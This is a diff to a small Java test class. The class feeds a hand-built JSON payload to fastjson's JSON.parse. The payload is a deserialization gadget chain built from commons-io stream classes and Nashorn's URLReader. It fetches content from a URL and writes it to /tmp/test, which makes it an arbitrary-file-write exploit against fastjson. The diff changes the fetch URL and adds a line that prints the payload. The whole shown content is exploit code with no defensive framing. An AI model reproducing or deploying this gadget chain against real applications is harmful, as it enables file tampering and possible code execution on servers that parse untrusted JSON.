@@ -16,7 +16,7 @@ public class test {
                 "      \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                 "      \"reader\": {\"@type\": \"org.apache.commons.io.input.TeeReader\",\n" +
                 "        \"input\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
-                "          \"url\": \"http://127.0.0.1:8082/2.txt\"\n" +
+                "          \"url\": \"http://127.0.0.1:8083/123123\"\n" +
                 "        },\n" +
                 "        \"branch\": {\"@type\":\"org.apache.commons.io.output.XmlStreamWriter\",\n" +
                 "          \"file\":\"/tmp/test\",\n" +
@@ -37,7 +37,7 @@ public class test {
                 "  },\n" +
                 "  \"address\" : {\"$ref\":\"$.abc.BOM\"}\n" +
                 "}";
-
+        System.out.println(json);
         JSON.parse(json);
     }
 }
